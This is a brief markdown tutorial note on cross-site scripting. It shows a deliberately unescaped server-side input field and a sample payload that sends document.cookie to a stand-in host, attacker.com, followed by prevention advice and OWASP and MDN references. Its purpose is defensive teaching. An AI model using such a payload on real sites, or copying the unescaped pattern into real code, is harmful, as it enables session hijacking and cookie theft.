# Cross Site Scripting ( XSS )

Injecting a maclious client side code by the hacker and running in our app or server etc. By doing so hackers can catch hold
of session tokens, cookie, and/or HTML content rewrite.

# Example:
## 1. Hijacking Session ID
HTML code for validation in client side 
```html
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";
```
XSS script by hacker 
```js
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
```

# How to prevent 
- Use modern framework which automatically escapes XSS attack. Like ReactJS, Ruby on Rails (latest)
- Escaping untrusted HTTP request (CSS, body, javascript, attribute, URL)
- Applying encoding while manipulating the DOM directly 
- Enabling Content Security Policy (CSP)

Reference
- [OWASP](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)
- [MDN](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)